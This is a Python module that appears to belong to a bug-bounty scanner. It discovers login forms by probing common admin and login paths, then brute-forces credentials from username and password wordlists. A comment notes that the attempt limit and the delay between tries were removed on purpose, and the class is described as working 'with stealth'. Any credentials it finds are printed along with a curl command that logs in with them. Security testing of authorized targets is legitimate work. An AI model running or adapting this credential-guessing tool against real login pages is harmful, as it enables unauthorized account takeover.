import asyncio
from typing import List, Dict, Optional, Tuple
from core.base_module import BaseModule, Finding
from pathlib import Path


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities with stealth"""

    # ── FIX: added graph_manager=None to match the 5-arg call in raptor.py ──
    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        # keep config fields to avoid breaking other code
        self.max_attempts   = config.get('max_attempts', 50)
        self.delay          = config.get('delay_between', 1)
        self.wordlist_path  = config.get('wordlist_path', 'wordlists')

    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Run brute force tests"""
        self.logger.info(f"Testing brute force protections on {target}")

        if not kwargs.get('enable_brute_force', False):
            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
            return self.findings

        login_endpoints = await self._discover_login_forms(target)

        if not login_endpoints:
            self.logger.warning("No login endpoints discovered")
            login_endpoints = [{'url': target, 'type': 'direct', 'fields': {}}]

        for endpoint in login_endpoints:
            await self._test_rate_limiting(endpoint)
            await self._test_brute_force(endpoint)

        return self.findings

    async def _discover_login_forms(self, target: str) -> List[Dict]:
        """Discover login endpoints — always tests target + common paths"""
        import re
        endpoints = []
        seen_urls = set()

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        from urllib.parse import urlparse, urljoin
        base = f"{urlparse(target).scheme}://{urlparse(target).netloc}"

        candidate_urls = [target]
        for path in [
            '/login', '/signin', '/auth', '/authenticate',
            '/admin', '/admin/login', '/user/login', '/account/login',
            '/api/login', '/api/auth', '/api/token',
            '/wp-login.php', '/administrator/index.php',
            '/admin.html', '/login.html', '/signin.html',
        ]:
            candidate_urls.append(base + path)

        for url in candidate_urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                response = await self._make_request(url)
                if not response or response.status not in [200, 301, 302]:
                    continue

                text = await response.text()
                indicators = ['password', 'login', 'username', 'email', 'sign in', 'log in',
                              'signin', 'passwd', 'credentials']

                if not any(ind in text.lower() for ind in indicators):
                    continue

                fields    = self._extract_form_fields(text)
                post_url  = url
                if fields.get('action'):
                    action = fields['action']
                    if action.startswith('http'):
                        post_url = action
                    elif action.startswith('/'):
                        post_url = base + action
                    else:
                        post_url = urljoin(url, action)

                endpoints.append({
                    'url':          post_url,
                    'type':         'form',
                    'fields':       fields,
                    'discovered_at': url
                })
                self.logger.info(f"Found login endpoint: {post_url} (from {url})")

            except Exception as e:
                self.logger.debug(f"Login discovery error on {url}: {e}")

        # Deduplicate by post URL
        seen   = set()
        unique = []
        for ep in endpoints:
            if ep['url'] not in seen:
                seen.add(ep['url'])
                unique.append(ep)

        return unique

    def _extract_form_fields(self, html: str) -> Dict:
        """Extract form fields from HTML"""
        import re
        fields  = {}
        inputs  = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        fields['inputs'] = inputs

        action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        fields['action'] = action.group(1) if action else ''

        username_candidates = ['username', 'user', 'email', 'login', 'name', 'uname']
        password_candidates = ['password', 'pass', 'pwd', 'passwd']

        fields['username_field'] = None
        fields['password_field'] = None

        for inp in inputs:
            inp_lower = inp.lower()
            if not fields['username_field']:
                for candidate in username_candidates:
                    if candidate in inp_lower:
                        fields['username_field'] = inp
                        break
            if not fields['password_field']:
                for candidate in password_candidates:
                    if candidate in inp_lower:
                        fields['password_field'] = inp
                        break

        if not fields['username_field']:
            fields['username_field'] = 'username'
        if not fields['password_field']:
            fields['password_field'] = 'password'

        return fields

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        """Load usernames and passwords from wordlists"""
        usernames = []
        passwords = []

        user_file = Path(self.wordlist_path) / 'usernames.txt'
        if user_file.exists():
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(usernames)} usernames")
        else:
            self.logger.warning(f"Usernames file not found: {user_file}")
            usernames = ['admin', 'administrator', 'user', 'test', 'root']

        pass_file = Path(self.wordlist_path) / 'passwords.txt'
        if pass_file.exists():
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
        else:
            self.logger.warning(f"Passwords file not found: {pass_file}")
            passwords = ['admin', 'password', '123456', 'login', 'admin123']

        return usernames, passwords

    async def _test_brute_force(self, endpoint: Dict):
        """Test brute force with wordlists"""
        url            = endpoint['url']
        fields         = endpoint.get('fields', {})
        username_field = fields.get('username_field', 'username')
        password_field = fields.get('password_field', 'password')

        self.logger.info(f"Starting brute force on {url}")
        self.logger.info(f"Using fields: {username_field} / {password_field}")

        usernames, passwords = self._load_wordlists()

        successful_logins = []
        rate_limited      = False
        attempt_count     = 0

        # NOTE: removed max_attempts limit and delay between attempts
        for username in usernames:
            for password in passwords:
                attempt_count += 1
                login_data    = {username_field: username, password_field: password}

                try:
                    response = await self._make_request(
                        url, method='POST', data=login_data, allow_redirects=True
                    )

                    if not response:
                        continue

                    is_success = await self._check_login_success(response, url)

                    if is_success:
                        sep = "=" * 60
                        print(f"\n\033[91m{sep}\033[0m")
                        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
                        print(f"\033[92m      Username : {username}\033[0m")
                        print(f"\033[92m      Password : {password}\033[0m")
                        print(f"\033[92m      URL      : {url}\033[0m")
                        print(f"\033[92m      Attempts : {attempt_count}\033[0m")
                        print(f"\033[91m{sep}\033[0m\n")

                        self.logger.info(f"CREDENTIALS FOUND: {username}:{password} @ {url}")
                        successful_logins.append({
                            'username': username,
                            'password': password,
                            'url':      url
                        })

                        finding = Finding(
                            module       = 'brute_force',
                            title        = f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
                            severity     = 'Critical',
                            description  = (
                                f'Successfully brute-forced login at {url}\n'
                                f'Username : {username}\n'
                                f'Password : {password}\n'
                                f'Attempts : {attempt_count}'
                            ),
                            evidence     = {
                                'username': username,
                                'password': password,
                                'url':      url,
                                'attempts': attempt_count
                            },
                            poc          = (
                                f"curl -X POST '{url}' "
                                f"-d '{username_field}={username}&{password_field}={password}'"
                            ),
                            remediation  = (
                                'Implement strong password policy, rate limiting, '
                                'and account lockout'
                            ),
                            cvss_score   = 9.8,
                            bounty_score = 5000,
                            target       = url
                        )
                        self.add_finding(finding)
                        return  # stop after first successful login

                    if response.status in [429, 503, 403]:
                        rate_limited = True
                        self.logger.info(f"Rate limited after {attempt_count} attempts")
                        break

                    text               = await response.text()
                    lockout_indicators = [
                        'locked', 'blocked', 'too many attempts',
                        'try again later', 'suspended'
                    ]
                    if any(ind in text.lower() for ind in lockout_indicators):
                        self.logger.info(f"Account lockout detected after {attempt_count} attempts")
                        break

                except Exception as e:
                    self.logger.error(f"Error during brute force attempt: {e}")

            if rate_limited or len(successful_logins) > 0:
                break

        if not successful_logins and not rate_limited and attempt_count > 0:
            self.logger.info(f"No valid credentials found after {attempt_count} attempts")

        if rate_limited:
            finding = Finding(
                module       = 'brute_force',
                title        = 'Rate Limiting Detected During Brute Force',
                severity     = 'Info',
                description  = f'Rate limiting triggered after {attempt_count} attempts',
                evidence     = {'attempts': attempt_count, 'url': url},
                poc          = f"Send {attempt_count} login requests to {url}",
                remediation  = 'Rate limiting is working correctly',
                cvss_score   = 0.0,
                bounty_score = 0,
                target       = url
            )
            self.add_finding(finding)

    async def _check_login_success(self, response, url: str) -> bool:
        """Check if login was successful based on response"""
        try:
            if response.status in [200, 301, 302, 303, 307, 308]:
                if 'Location' in response.headers:
                    location      = response.headers['Location']
                    success_paths = ['/dashboard', '/admin', '/home', '/profile',
                                     '/account', '/welcome']
                    if any(path in location.lower() for path in success_paths):
                        return True

                text = await response.text()

                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'profile', 'admin panel',
                    'successful', 'logged in', 'session', 'token', 'api_key'
                ]
                failure_indicators = [
                    'invalid', 'incorrect', 'failed', 'error', 'wrong',
                    'denied', 'unauthorized', 'try again', 'not found'
                ]

                text_lower    = text.lower()
                success_count = sum(1 for ind in success_indicators if ind in text_lower)
                failure_count = sum(1 for ind in failure_indicators if ind in text_lower)

                if success_count > failure_count:
                    return True

                if 'Set-Cookie' in response.headers:
                    cookies = response.headers['Set-Cookie'].lower()
                    if any(sess in cookies for sess in ['session', 'token', 'auth', 'jwt']):
                        return True

            return False

        except Exception as e:
            self.logger.error(f"Error checking login success: {e}")
            return False

    async def _test_rate_limiting(self, endpoint: Dict):
        """Test if rate limiting is implemented"""
        url       = endpoint['url']
        responses = []

        for i in range(min(5, self.max_attempts)):
            response = await self._make_request(
                url, method='POST',
                data={'username': f'test{i}', 'password': 'wrong'}
            )
            if response:
                responses.append(response.status)
            await asyncio.sleep(0.5)

        if 429 in responses or 503 in responses:
            self.logger.info(f"Rate limiting detected on {url}")
        else:
            finding = Finding(
                module       = 'brute_force',
                title        = 'Missing Rate Limiting on Authentication',
                severity     = 'High',
                description  = (
                    f'No rate limiting detected on {url} after '
                    f'{len(responses)} rapid requests'
                ),
                evidence     = {
                    'endpoint':  url,
                    'requests':  len(responses),
                    'responses': responses
                },
                poc          = f"Send multiple rapid login requests to {url}",
                remediation  = (
                    'Implement rate limiting '
                    '(max 5 attempts per IP per 15 minutes)'
                ),
                cvss_score   = 7.5,
                bounty_score = 1000,
                target       = url
            )
            self.add_finding(finding)
